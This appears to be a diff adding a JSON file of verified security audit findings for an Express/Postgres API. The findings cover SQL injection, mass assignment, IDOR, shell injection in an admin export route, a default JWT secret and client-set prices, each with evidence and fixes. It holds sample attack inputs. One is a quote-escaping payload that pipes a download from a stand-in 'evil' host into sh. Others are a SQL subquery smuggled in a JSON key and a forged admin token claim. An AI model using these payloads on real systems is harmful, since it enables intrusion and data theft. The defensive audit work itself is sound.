@@ -1,0 +1,372 @@
+[
+  {
+    "id": "SEC-233e01",
+    "domain": "security",
+    "category": "sql-injection",
+    "symbol": "GET /api/users/:id",
+    "title": "GET /api/users/:id interpolates req.params.id into SQL",
+    "severity": "critical",
+    "reportedSeverity": "critical",
+    "verification": {
+      "verdict": "confirmed",
+      "reasoning": "api/users.js:8 puts req.params.id straight into the SQL text with a template literal and passes no params array. src/db.js:7-8 forwards text and params to pool.query unchanged. With no params, pg uses the simple query protocol, so UNION and stacked statements both work. The only guard is requireAuth at src/server.js:13, and the route has no per-route validation. Critical is correct."
+    },
+    "confidence": "high",
+    "rationale": "req.params.id is placed into the query string with a template literal and passed to db.query with no params array. db.query (src/db.js:7-9) forwards the text to pool.query unchanged. Any authenticated user reaches this route; requireAuth is the only guard (src/server.js:13).",
+    "evidence": [
+      {
+        "file": "api/users.js",
+        "lineRange": "8",
+        "codeSnippet": "const rows = await db.query(`select id, email, role from users where id = ${req.params.id}`);"
+      }
+    ],
+    "impact": "Any logged-in customer can run arbitrary SQL. For example, a UNION can return password_hash for every user, and stacked statements can modify data.",
+    "recommendation": {
+      "action": "Parameterize the query and validate that the id is an integer.",
+      "effort": "low",
+      "code_example": "db.query('select id, email, role from users where id = $1', [Number.parseInt(req.params.id, 10)])"
+    },
+    "effort": "low",
+    "fileTargets": [
+      "api/users.js"
+    ],
+    "relatedFindings": [
+      "GET /api/users/:id returns any user's record without an ownership check"
+    ],
+    "tags": [
+      "injection",
+      "database"
+    ]
+  },
+  {
+    "id": "SEC-287d42",
+    "domain": "security",
+    "category": "sql-injection",
+    "symbol": "PATCH /api/users/:id",
+    "title": "PATCH /api/users/:id builds the SET clause from request body keys",
+    "severity": "critical",
+    "reportedSeverity": "critical",
+    "verification": {
+      "verdict": "confirmed",
+      "reasoning": "api/users.js:22-24 builds the SET clause from Object.keys(req.body) with no allowlist. express.json (src/server.js:10) accepts any JSON key. Because a params array is passed, pg uses the extended protocol, which rules out stacked statements. A key like `email = (select password_hash from users where id=1), role` still injects a subquery, and RETURNING id,email,role sends the result back. The ownership check at line 21 only fixes the target row to the caller's own id, which any authenticated user can pass. This lets a user read or alter other rows' data through subqueries. Critical stands."
+    },
+    "confidence": "high",
+    "rationale": "Object.keys(req.body) are placed into the SQL text verbatim as column names. Values are parameterized, but identifiers are not checked against an allowlist. The only guard is that the caller is patching their own id, and any authenticated user meets that.",
+    "evidence": [
+      {
+        "file": "api/users.js",
+        "lineRange": "22-24",
+        "codeSnippet": "const fields = Object.keys(req.body);\n  const assignments = fields.map((field, index) => `${field} = $${index + 2}`).join(', ');\n  const rows = await db.query(`update users set ${assignments} where id = $1 returning id, email, role`, [req.params.id, ...fields.map((f) => req.body[f])]);"
+      }
+    ],
+    "impact": "Any logged-in user can inject SQL through a JSON key, for example {\"role = 'admin', email\": \"x\"}, or a subquery in the key. That allows reading or rewriting other rows.",
+    "recommendation": {
+      "action": "Allow only a fixed set of updatable columns (for example email) and reject any other key before building the query.",
+      "effort": "low",
+      "code_example": "const ALLOWED = new Set(['email']); const fields = Object.keys(req.body).filter((f) => ALLOWED.has(f));"
+    },
+    "effort": "low",
+    "fileTargets": [
+      "api/users.js"
+    ],
+    "relatedFindings": [
+      "PATCH /api/users/:id lets a user set their own role to admin"
+    ],
+    "tags": [
+      "injection",
+      "database"
+    ]
+  },
+  {
+    "id": "SEC-0bb311",
+    "domain": "security",
+    "category": "mass-assignment",
+    "symbol": "PATCH /api/users/:id",
+    "title": "PATCH /api/users/:id lets a user set their own role to admin",
+    "severity": "medium",
+    "reportedSeverity": "high",
+    "verification": {
+      "verdict": "downgraded",
+      "reasoning": "The mass assignment is real: api/users.js:22-24 writes any body key, including role (prisma/schema.sql:5), to the caller's own row. But requireAdmin (src/auth.js:17) checks the role claim inside the JWT, not the database. The repo has no jwt.sign or login/token issuer (grep over api/, src/, workers/ found none). So whether a role written to the database ever becomes an admin token depends on code outside this repo. The escalation to /api/admin/export is unconfirmed. The confirmed impact is an unauthorized write to one's own role column.",
+      "severity": "medium"
+    },
+    "confidence": "high",
+    "rationale": "Every key in req.body becomes a column update, including role and password_hash (prisma/schema.sql:4-5). A user patching their own record can send {\"role\":\"admin\"}. requireAdmin trusts the role claim in the JWT, so once a token is issued from this row the user passes the admin guard.",
+    "evidence": [
+      {
+        "file": "api/users.js",
+        "lineRange": "21-24",
+        "codeSnippet": "if (String(req.user.sub) !== req.params.id) return res.status(403).json({ error: 'forbidden' });\n  const fields = Object.keys(req.body);"
+      },
+      {
+        "file": "src/auth.js",
+        "lineRange": "17",
+        "codeSnippet": "if (!req.user || req.user.role !== 'admin') return res.status(403).json({ error: 'forbidden' });"
+      }
+    ],
+    "impact": "Any customer can become an admin and reach /api/admin/export, which has a shell injection.",
+    "recommendation": {
+      "action": "Allow only the user-editable columns (for example email). Change role only through an admin-only path.",
+      "effort": "low",
+      "code_example": ""
+    },
+    "effort": "low",
+    "fileTargets": [
+      "api/users.js",
+      "src/auth.js"
+    ],
+    "relatedFindings": [
+      "POST /api/admin/export passes req.body.table into a shell command"
+    ],
+    "tags": [
+      "privilege-escalation"
+    ]
+  },
+  {
+    "id": "SEC-465613",
+    "domain": "security",
+    "category": "command-injection",
+    "symbol": "POST /api/admin/export",
+    "title": "POST /api/admin/export passes req.body.table into a shell command",
+    "severity": "high",
+    "reportedSeverity": "high",
+    "verification": {
+      "verdict": "confirmed",
+      "reasoning": "api/admin.js:13 puts req.body.table into an execSync command string, which runs through a shell. The handler never checks the table against the TABLES allowlist at src/db.js:13; only countRows (src/db.js:15) uses it. A value containing a double quote and `;` escapes the quoting and runs arbitrary commands. Only admins can reach it (requireAuth and requireAdmin at src/server.js:15), and admin is reachable with a forged token if the default secret is in use (src/config.js:6). Admin-gated RCE rated high is appropriate."
+    },
+    "confidence": "high",
+    "rationale": "req.body.table is put into an execSync command string run by /bin/sh. It does not go through the TABLES allowlist in src/db.js:13. A value such as `orders to stdout\"; curl evil|sh; #` breaks out of the quotes. The route requires the admin role, but that role can be gained through the PATCH mass assignment or a forged JWT signed with the default secret.",
+    "evidence": [
+      {
+        "file": "api/admin.js",
+        "lineRange": "13",
+        "codeSnippet": "const output = execSync(`psql \"$DATABASE_URL\" -c \"\\\\copy ${req.body.table} to stdout csv\"`).toString();"
+      }
+    ],
+    "impact": "Remote code execution on the API host with access to DATABASE_URL and every environment secret.",
+    "recommendation": {
+      "action": "Check the table name against the TABLES allowlist and stop using a shell. Use pg COPY through pg-copy-streams, or execFile('psql', [...]) with no shell.",
+      "effort": "medium",
+      "code_example": "if (!['users','orders','products'].includes(req.body.table)) return res.status(400).end();"
+    },
+    "effort": "medium",
+    "fileTargets": [
+      "api/admin.js"
+    ],
+    "relatedFindings": [
+      "PATCH /api/users/:id lets a user set their own role to admin",
+      "JWT secret falls back to 'change-me'"
+    ],
+    "tags": [
+      "rce",
+      "injection"
+    ]
+  },
+  {
+    "id": "SEC-b7cee0",
+    "domain": "security",
+    "category": "idor",
+    "symbol": "GET /api/users/:id",
+    "title": "GET /api/users/:id returns any user's record without an ownership check",
+    "severity": "high",
+    "reportedSeverity": "high",
+    "verification": {
+      "verdict": "confirmed",
+      "reasoning": "api/users.js:7-10 returns id, email and role for any client-supplied id. There is no comparison with req.user.sub and no role check, while PATCH at line 21 does check ownership. The router-level guard is only requireAuth (src/server.js:13). Any authenticated user can enumerate other users' email and role."
+    },
+    "confidence": "high",
+    "rationale": "The handler loads a user by a client-supplied id and never compares it to req.user.sub or checks for the admin role. The PATCH route next to it does enforce ownership.",
+    "evidence": [
+      {
+        "file": "api/users.js",
+        "lineRange": "7-10",
+        "codeSnippet": "router.get('/:id', async (req, res) => {\n  const rows = await db.query(`select id, email, role from users where id = ${req.params.id}`);\n  if (!rows.length) return res.status(404).json({ error: 'not found' });\n  res.json(rows[0]);"
+      }
+    ],
+    "impact": "Any customer can list every user's email and role by walking sequential ids.",
+    "recommendation": {
+      "action": "Return 403 unless String(req.user.sub) === req.params.id or req.user.role === 'admin'.",
+      "effort": "low",
+      "code_example": ""
+    },
+    "effort": "low",
+    "fileTargets": [
+      "api/users.js"
+    ],
+    "relatedFindings": [
+      "GET /api/users/:id interpolates req.params.id into SQL"
+    ],
+    "tags": [
+      "authorization",
+      "pii"
+    ]
+  },
+  {
+    "id": "SEC-147c0e",
+    "domain": "security",
+    "category": "broken-access-control",
+    "symbol": "GET /api/users",
+    "title": "GET /api/users returns every user's email and role to any logged-in user",
+    "severity": "high",
+    "reportedSeverity": "high",
+    "verification": {
+      "verdict": "confirmed",
+      "reasoning": "api/users.js:14-16 returns id, email, role and created_at for every user, with no role check. The router is mounted with only requireAuth at src/server.js:13, while requireAdmin is applied only to /api/admin (src/server.js:15). Any customer can pull the full user list in one request."
+    },
+    "confidence": "high",
+    "rationale": "The /api/users router is guarded only by requireAuth (src/server.js:13). The list handler has no role check, while the equivalent admin data sits behind requireAdmin.",
+    "evidence": [
+      {
+        "file": "api/users.js",
+        "lineRange": "14-16",
+        "codeSnippet": "router.get('/', async (req, res) => {\n  const rows = await db.query('select id, email, role, created_at from users order by created_at desc');\n  res.json(rows);"
+      }
+    ],
+    "impact": "Any customer can download the full customer list (emails and roles) in one request.",
+    "recommendation": {
+      "action": "Put requireAdmin on this route or move it under /api/admin.",
+      "effort": "low",
+      "code_example": "router.get('/', requireAdmin, async (req, res) => { ... })"
+    },
+    "effort": "low",
+    "fileTargets": [
+      "api/users.js"
+    ],
+    "relatedFindings": [],
+    "tags": [
+      "authorization",
+      "pii"
+    ]
+  },
+  {
+    "id": "SEC-55f50c",
+    "domain": "security",
+    "category": "hardcoded-secret",
+    "symbol": "stripeKey",
+    "title": "Live-format Stripe secret key hardcoded as config fallback",
+    "severity": "medium",
+    "reportedSeverity": "critical",
+    "verification": {
+      "verdict": "downgraded",
+      "reasoning": "src/config.js:5 does fall back to a hardcoded sk_live_ literal when STRIPE_SECRET_KEY is unset, and api/webhooks.js:8 builds the Stripe client from it. But the value follows an obvious synthetic pattern ('...NpQrStUvWxYz0123456789ABCDEFGHIJ'), and .env.example:2 uses sk_test_xxx. Nothing shows this is a live credential. The confirmed defect is a silent fallback to a committed placeholder key instead of failing at startup. The account-compromise impact rests on the key being real, which is unverified.",
+      "severity": "medium"
+    },
+    "confidence": "medium",
+    "rationale": "config.stripeKey falls back to a literal sk_live_ key whenever STRIPE_SECRET_KEY is unset. A secret key is committed to source, and production silently uses it if the env var is missing. The value looks synthetic ('0123456789ABCDEFGHIJ'), so whether it is a real key cannot be confirmed without testing it against Stripe.",
+    "evidence": [
+      {
+        "file": "src/config.js",
+        "lineRange": "5",
+        "codeSnippet": "stripeKey: process.env.STRIPE_SECRET_KEY || 'sk_live_FAKE_planted_for_tests_not_a_real_key',"
+      }
+    ],
+    "impact": "If the key is real, anyone with repo access can issue refunds, read customer payment data, and create charges on the live Stripe account.",
+    "recommendation": {
+      "action": "Remove the literal and fail at startup when STRIPE_SECRET_KEY is missing. Rotate the key in Stripe and purge it from git history.",
+      "effort": "low",
+      "code_example": "stripeKey: required('STRIPE_SECRET_KEY'),"
+    },
+    "effort": "low",
+    "fileTargets": [
+      "src/config.js"
+    ],
+    "relatedFindings": [],
+    "tags": [
+      "secrets",
+      "stripe"
+    ]
+  },
+  {
+    "id": "SEC-c5ac00",
+    "domain": "security",
+    "category": "jwt-misconfiguration",
+    "symbol": "jwtSecret",
+    "title": "JWT secret falls back to 'change-me'",
+    "severity": "high",
+    "reportedSeverity": "high",
+    "verification": {
+      "verdict": "confirmed",
+      "reasoning": "src/config.js:6 defaults jwtSecret to 'change-me', and .env.example:3 ships the same value. src/auth.js:9 verifies HS256 tokens with that secret, and src/auth.js:17 grants admin based only on the token's role claim. If JWT_SECRET is unset or copied from the example, anyone can forge an admin token and reach the shell-injectable export at api/admin.js:13. That precondition is why the reporter rated confidence medium. High severity is appropriate given the admin and RCE reach."
+    },
+    "confidence": "medium",
+    "rationale": "requireAuth verifies tokens with config.jwtSecret, which defaults to the public string 'change-me' when JWT_SECRET is unset. .env.example uses the same value, so a deployment copied from the example is also exposed. requireAdmin trusts the role claim in the token.",
+    "evidence": [
+      {
+        "file": "src/config.js",
+        "lineRange": "6",
+        "codeSnippet": "jwtSecret: process.env.JWT_SECRET || 'change-me',"
+      },
+      {
+        "file": "src/auth.js",
+        "lineRange": "9",
+        "codeSnippet": "req.user = jwt.verify(token, config.jwtSecret, { algorithms: ['HS256'] });"
+      }
+    ],
+    "impact": "If the env var is missing or left at the example value, anyone can forge {\"sub\":1,\"role\":\"admin\"} and get full admin access, including the shell-injectable export route.",
+    "recommendation": {
+      "action": "Fail at startup when JWT_SECRET is unset or shorter than 32 bytes, and remove the default.",
+      "effort": "low",
+      "code_example": "if (!process.env.JWT_SECRET || process.env.JWT_SECRET.length < 32) throw new Error('JWT_SECRET required');"
+    },
+    "effort": "low",
+    "fileTargets": [
+      "src/config.js",
+      "src/auth.js"
+    ],
+    "relatedFindings": [
+      "POST /api/admin/export passes req.body.table into a shell command"
+    ],
+    "tags": [
+      "jwt",
+      "auth"
+    ]
+  },
+  {
+    "id": "SEC-e15003",
+    "domain": "security",
+    "category": "price-tampering",
+    "symbol": "POST /api/orders",
+    "title": "POST /api/orders takes the order total from client-supplied priceCents",
+    "severity": "medium",
+    "reportedSeverity": "high",
+    "verification": {
+      "verdict": "downgraded",
+      "reasoning": "This is real: validateItems (api/orders.js:33) only checks that priceCents is a non-negative integer, and api/orders.js:19-20 computes and stores total_cents from client prices, including 0. However, there is no products table in prisma/schema.sql (only users, orders, order_items), and no code in the repo creates a Stripe charge from total_cents (grep found no paymentIntent or charge creation). So it is unconfirmed that the amount actually charged is affected. Also, the webhook (api/webhooks.js:12-15) marks orders paid without checking the amount, so the underpayment path is not shown here. The confirmed impact is wrong order totals in stored data.",
+      "severity": "medium"
+    },
+    "confidence": "medium",
+    "rationale": "validateItems only checks that priceCents is a non-negative integer. The total is then computed from those client values and stored as total_cents, with no lookup of real product prices. No code in the repo creates the Stripe charge, so it is unconfirmed whether the charge amount comes from this total.",
+    "evidence": [
+      {
+        "file": "api/orders.js",
+        "lineRange": "19-20",
+        "codeSnippet": "const total = items.reduce((sum, item) => sum + item.priceCents * item.quantity, 0);\n  const [order] = await db.query('insert into orders (user_id, total_cents, status) values ($1, $2, $3) returning id', [req.user.sub, total, 'pending']);"
+      },
+      {
+        "file": "api/orders.js",
+        "lineRange": "19",
+        "codeSnippet": "const total = items.reduce((sum, item) => sum + item.priceCents * item.quantity, 0);"
+      }
+    ],
+    "impact": "A customer can create orders at any price, including 0 cents. Combined with the unsigned webhook, the order can then be marked paid.",
+    "recommendation": {
+      "action": "Ignore client prices. Load the unit price for each productId from the products table on the server and compute the total from those prices.",
+      "effort": "medium",
+      "code_example": ""
+    },
+    "effort": "medium",
+    "fileTargets": [
+      "api/orders.js"
+    ],
+    "relatedFindings": [
+      "Stripe webhook accepts unsigned events and marks any order paid",
+      "POST /api/orders trusts client-supplied priceCents to compute the order total"
+    ],
+    "tags": [
+      "payments",
+      "business-logic",
+      "orders",
+      "merged-from:backend"
+    ]
+  }
+]
